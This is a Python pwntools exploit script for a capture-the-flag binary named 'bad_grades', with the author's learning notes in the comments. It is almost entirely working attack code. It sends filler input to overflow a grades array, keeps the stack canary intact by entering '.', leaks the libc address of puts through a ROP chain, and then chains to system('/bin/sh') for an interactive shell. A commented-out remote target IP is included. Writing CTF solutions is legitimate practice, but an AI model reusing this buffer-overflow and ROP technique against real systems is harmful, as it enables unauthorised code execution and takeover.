from pwn import *
from decimal import Decimal

bad_grades_file = ELF('./bad_grades')
libc = ELF('libc.so.6')
bad_grades_rop = ROP(bad_grades_file)

# Get PLT and GOT entries for puts because we want to leak /bin/sh address in GOT (like Lockheed talk)
# Note to self: PLT contains assembly code to execute GOT. This should be static
# GOT is basically a table that contains DLL addresses
# Might be wrong but I think these don't change with ASLR either
plt_puts = bad_grades_file.plt['puts']
got_puts = bad_grades_file.got['puts']

# TO DO: Find a way to bypass stack canary bc I don't see a printf (maybe exploit scanf if we can overwrite the format string)
# TO DO v2: https://rehex.ninja/posts/scanf-and-hateful-dot/
# TO DO v3: Try to just use a dot

# 0x110 (35 * 8 --> write 36 times) between return addr and buffer     --> bc remember it comes before [RET]
# 0x108 (33 * 8 --> write 34 times) between canary and buffer

# ROP Gadgets
# POP RDI; RET      --> RDI is the 1st argument, so pop stack <-- RDI and return (jump to sp address again!)
rdi = bad_grades_rop.rdi.address
ret = bad_grades_rop.ret.address        # Pray we don't get stack align'd
# main_addr = bad_grades_file.symbols['Main']     # no PIE makes this nice
main_addr = 0x00401108                  # oops I renamed the function in Ghidra so we can't use the symbol table but here you go

# Step 1: Leak libc address
# We need to import custom libc.so.6 --> https://stackoverflow.com/questions/70341864/are-there-any-way-to-load-another-version-of-libc-library-into-a-pwntools-scri
# p = bad_grades_file.process(env={"LD_PRELOAD" : "./libc.so.6"})         # We might be using a diff libc? Found on stack overflow
p = process(['./ld-2.27.so', bad_grades_file.path], env={"LD_PRELOAD": libc.path})
# p = remote("94.237.62.147", 34891)

# Your grades this sem was really bad....
print(p.recvline())
print(p.recvline())
print(p.recvline())     # Add new

p.sendline(b'2')        # Turns out pwntools wants bytes
print(p.recvline())     # Send lines
p.sendline(b'39')       # note to self: change this depending on how many ROP commands we send. 35 covers basic overflow

# Send filler 33 to fill up buffer
for i in range(33):
    p.sendline(b'100')

# Don't overwrite Canary - we talked about this earlier in the code
p.sendline(b'.')
p.sendline(b'.')     # prolly not good to touch fp too

def addr_to_int(addr):
    '''
    Converts an address into an int
    @param addr Hex address
    '''
    addr_hex = p64(addr)         # Convert to hex addr first
    address_number = struct.unpack('d', addr_hex)[0]     # To do: test this line because I do not trust Bing Copilot

    # To do: figure out how to handle E-318 (what even is that I think some twos complement stuff happened or smth)
    # Bing copilot said to brute force this double
    output_str = f"{address_number:.2000f}"

    return output_str.encode('ascii')       # pwntools needs bytes

# ROP chain - 4 items


'''
Writing it here so I don't forget later: The ROP Chain looks like (read from bottom up):

main()          --> puts() also has a RET! It now jumps to main
puts() because calling PLT is basically invoking function       --> return address. Now you get puts(PUTS() ADDRESS)
PUTS() address in GOT       --> arg[0]
POP RDI; RET        --> Load line above as param. When you RET, the line above the param is the return address.
'''
# print(addr_to_int(rdi))
p.sendline(addr_to_int(rdi))
p.sendline(addr_to_int(got_puts))
p.sendline(addr_to_int(plt_puts))
p.sendline(addr_to_int(main_addr))

print(p.recvline())
# print(p.recv(8))
# print(p.recv(8 * 6))
puts_addr = p.recv(6)
p.recvline()

# Woah! We have puts_addr. Parse it
puts_addr = int.from_bytes(puts_addr, byteorder='little')
print()
print(f'Found libc puts address! {puts_addr}')

# Trick from Lockheed talk: calculate actual puts address - puts address relative to the linked file (bc funny ASLR i think) = libc address
relative_puts_addr = libc.symbols["puts"]
libc_addr = puts_addr - relative_puts_addr

print(f'Found libc address! {libc_addr}')

# Get /bin/sh and system
system_addr = libc_addr + libc.symbols["system"]
binsh_addr = libc_addr + list(libc.search(b"/bin/sh\x00"))[0]

print(f'Found system address! {system_addr}')
print(f'Found location of a /bin/sh! {binsh_addr}')
print()

# Part 2: Construct a ROP to execute /bin/sh
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())     # Add new

# Repeat from step 1
p.sendline(b'2')        # Turns out pwntools wants bytes
# print(p.recvline())     # Send lines
p.sendline(b'39')       # note to self: change this depending on how many ROP commands we send. 35 covers basic overflow

# Send filler 33 to fill up buffer
for i in range(33):
    p.sendline(b'100')

# Don't overwrite Canary - we talked about this earlier in the code
p.sendline(b'.')
p.sendline(b'.')     # prolly not good to touch fp too

# ROP chain - 4 items
'''
The ROP Chain looks like (read from bottom up):

system()        --> return address. Now you get system(/bin/sh)
/bin/sh address       --> arg[0]
POP RDI; RET        --> Load line above as param. When you RET, the line above the param is the return address.
RET;                --> Dumb stack alignment stuff. Literally just goes to the next item and uses it as stuff to execute
'''
# We don't need to convert to int here for most of them because somehow the addresses we got from symbol[] are already int
p.sendline(addr_to_int(ret))
p.sendline(addr_to_int(rdi))
p.sendline(addr_to_int(binsh_addr))
p.sendline(addr_to_int(system_addr))

p.interactive()
